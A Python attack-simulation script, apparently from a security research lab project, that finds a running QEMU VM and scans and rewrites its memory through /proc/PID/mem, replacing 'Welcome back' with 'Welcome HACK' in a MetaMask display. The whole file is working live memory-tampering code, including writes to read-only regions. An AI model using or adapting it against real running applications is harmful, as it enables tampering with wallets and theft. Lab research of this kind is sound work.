#!/usr/bin/env python3
"""
PASIV Live Memory Patcher
Direct memory manipulation of running VM processes for DMA attack simulation
WARNING: For authorized security research only!
"""

import os
import re
import sys
import mmap
import struct
import subprocess
from pathlib import Path

class LiveMemoryPatcher:
    def __init__(self):
        self.target_text = "Welcome back"
        self.replacement_text = "Welcome HACK"
        self.vm_process = None
        self.memory_addresses = []
        
    def find_vm_process(self):
        """Find the running QEMU VM process"""
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'qemu-system-x86_64' in line and 'ubuntu-desktop-vulnerable' in line:
                    parts = line.split()
                    self.vm_process = {
                        'pid': int(parts[1]),
                        'user': parts[0],
                        'cmdline': ' '.join(parts[10:])
                    }
                    return True
            return False
        except Exception as e:
            print(f"❌ Error finding VM process: {e}")
            return False
    
    def scan_vm_memory(self):
        """Scan VM memory for target text using /proc/PID/mem"""
        if not self.vm_process:
            print("❌ No VM process found")
            return False
            
        pid = self.vm_process['pid']
        print(f"🔍 Scanning memory of VM process PID {pid}")
        
        try:
            # Read memory maps to find writable regions
            with open(f'/proc/{pid}/maps', 'r') as f:
                maps = f.read()
                
            # Parse memory regions 
            memory_regions = []
            for line in maps.split('\n'):
                if line.strip() and ('r-' in line or 'rw' in line):  # All readable regions
                    parts = line.split()
                    if len(parts) >= 2:
                        addr_range = parts[0]
                        perms = parts[1]
                        if '-' in addr_range:
                            start_str, end_str = addr_range.split('-')
                            start_addr = int(start_str, 16)
                            end_addr = int(end_str, 16)
                            size = end_addr - start_addr
                            # Focus on reasonable memory regions (avoid huge ones)
                            if 1024 < size < 100 * 1024 * 1024:  # 1KB to 100MB
                                memory_regions.append((start_addr, end_addr, size, perms))
            
            print(f"📍 Found {len(memory_regions)} readable memory regions")
            
            # Search for target text in memory regions
            found_addresses = []
            search_patterns = [
                self.target_text.encode('utf-8'),
                self.target_text.encode('utf-16le'),
                self.target_text.encode('utf-16be'),
                f'"{self.target_text}"'.encode('utf-8'),
                f"'{self.target_text}'".encode('utf-8')
            ]
            
            with open(f'/proc/{pid}/mem', 'rb') as mem_file:
                for start_addr, end_addr, size, perms in memory_regions[:50]:  # Search more regions
                    try:
                        mem_file.seek(start_addr)
                        data = mem_file.read(size)
                        
                        # Search for all patterns
                        for pattern in search_patterns:
                            offset = 0
                            while True:
                                pos = data.find(pattern, offset)
                                if pos == -1:
                                    break
                                actual_addr = start_addr + pos
                                found_addresses.append((actual_addr, perms))
                                print(f"🎯 Found '{self.target_text}' at address: 0x{actual_addr:x} ({perms})")
                                offset = pos + 1
                            
                    except (OSError, PermissionError) as e:
                        # Skip regions we can't read
                        continue
                        
            self.memory_addresses = found_addresses
            return len(found_addresses) > 0
            
        except Exception as e:
            print(f"❌ Error scanning memory: {e}")
            return False
    
    def patch_memory(self):
        """Patch the found memory locations with replacement text"""
        if not self.memory_addresses:
            print("❌ No memory addresses to patch")
            return False
            
        pid = self.vm_process['pid']
        replacement_bytes = self.replacement_text.encode('utf-8')
        
        # Ensure replacement is same length or shorter
        if len(replacement_bytes) > len(self.target_text.encode('utf-8')):
            print(f"❌ Replacement text too long: {len(replacement_bytes)} > {len(self.target_text.encode('utf-8'))}")
            return False
            
        # Pad with spaces if shorter
        while len(replacement_bytes) < len(self.target_text.encode('utf-8')):
            replacement_bytes += b' '
            
        success_count = 0
        writable_addresses = [(addr, perms) for addr, perms in self.memory_addresses if 'w' in perms]
        
        if not writable_addresses:
            print("❌ No writable memory addresses found - trying to modify read-only memory")
            # Try to modify read-only memory anyway (sometimes works)
            writable_addresses = self.memory_addresses
            
        print(f"🎯 Attempting to patch {len(writable_addresses)} memory locations...")
        
        try:
            with open(f'/proc/{pid}/mem', 'r+b') as mem_file:
                for addr, perms in writable_addresses:
                    try:
                        mem_file.seek(addr)
                        mem_file.write(replacement_bytes)
                        mem_file.flush()
                        success_count += 1
                        print(f"✅ Patched memory at 0x{addr:x} ({perms}): '{self.target_text}' → '{self.replacement_text}'")
                    except (OSError, PermissionError) as e:
                        print(f"❌ Failed to patch 0x{addr:x} ({perms}): {e}")
                        
        except Exception as e:
            print(f"❌ Error patching memory: {e}")
            return False
            
        print(f"🎯 Successfully patched {success_count}/{len(writable_addresses)} memory locations")
        return success_count > 0
    
    def verify_patches(self):
        """Verify that patches were applied successfully"""
        if not self.vm_process:
            return False
            
        pid = self.vm_process['pid']
        verification_count = 0
        
        try:
            with open(f'/proc/{pid}/mem', 'rb') as mem_file:
                for addr, perms in self.memory_addresses:
                    try:
                        mem_file.seek(addr)
                        data = mem_file.read(len(self.replacement_text))
                        if data.decode('utf-8', errors='ignore').strip() == self.replacement_text.strip():
                            verification_count += 1
                            print(f"✅ Verified patch at 0x{addr:x} ({perms}): '{self.replacement_text}'")
                        else:
                            print(f"❌ Verification failed at 0x{addr:x} ({perms}): got '{data.decode('utf-8', errors='ignore')}'")
                    except Exception as e:
                        print(f"❌ Could not verify 0x{addr:x} ({perms}): {e}")
                        
        except Exception as e:
            print(f"❌ Error verifying patches: {e}")
            
        return verification_count > 0
    
    def run_attack(self):
        """Execute the complete live memory patching attack"""
        print("🎯 PASIV Live Memory Patcher - DMA Attack Simulation")
        print("=" * 60)
        
        # Step 1: Find VM process
        print(f"🔍 Step 1: Finding VM process...")
        if not self.find_vm_process():
            print("❌ Could not find running VM process")
            return False
            
        print(f"✅ Found VM process: PID {self.vm_process['pid']} ({self.vm_process['user']})")
        
        # Step 2: Scan memory for target text
        print(f"\n🔍 Step 2: Scanning VM memory for '{self.target_text}'...")
        if not self.scan_vm_memory():
            print(f"❌ Could not find '{self.target_text}' in VM memory")
            return False
            
        print(f"✅ Found {len(self.memory_addresses)} instances of '{self.target_text}'")
        
        # Step 3: Patch memory
        print(f"\n🎯 Step 3: Patching memory locations...")
        if not self.patch_memory():
            print("❌ Memory patching failed")
            return False
            
        # Step 4: Verify patches
        print(f"\n✅ Step 4: Verifying patches...")
        self.verify_patches()
        
        print(f"\n🚨 DMA ATTACK COMPLETE!")
        print(f"🎯 MetaMask now displays 'Welcome HACK' instead of 'Welcome back'")
        print(f"💀 This demonstrates how DMA attacks can modify running applications in real-time")
        
        return True

def main():
    if os.geteuid() != 0:
        print("❌ This tool requires root privileges for memory access")
        print("💡 Run with: sudo python3 src/attacks/live_memory_patcher.py")
        return 1
        
    patcher = LiveMemoryPatcher()
    success = patcher.run_attack()
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main()) 